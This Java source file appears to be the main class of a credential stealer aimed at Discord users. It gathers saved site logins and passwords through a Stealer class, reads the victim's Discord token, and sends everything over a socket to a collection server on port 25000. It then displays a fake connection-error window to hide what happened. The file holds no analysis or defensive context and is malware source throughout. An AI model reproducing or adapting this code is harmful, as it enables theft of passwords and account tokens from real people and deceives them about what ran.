package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.Data;
import me.mafrans.discordsw.stealer.Stealer;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.List;

public class Main {
    private static Socket socket;

    public static void main(String[] b) {
        try {
            String host = "localhost";
            int port = 25000;
            socket = new Socket(host, port);

            OutputStream os = socket.getOutputStream();
            OutputStreamWriter osw = new OutputStreamWriter(os);
            BufferedWriter bw = new BufferedWriter(osw);


            List<Data> dataList = Stealer.steal();

            StringBuilder builder = new StringBuilder();
            builder.append("Token: " + Discord.getToken().replace(" ", "") + "||||||");
            for(Data data : dataList) {
                builder.append(data.siteURL + ":||");
                builder.append("Username: " + data.username + "||");
                builder.append("Password: " + data.password + "||||");
            }

            bw.write(builder.toString());
            System.out.println(builder.toString());
            bw.flush();
            socket.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
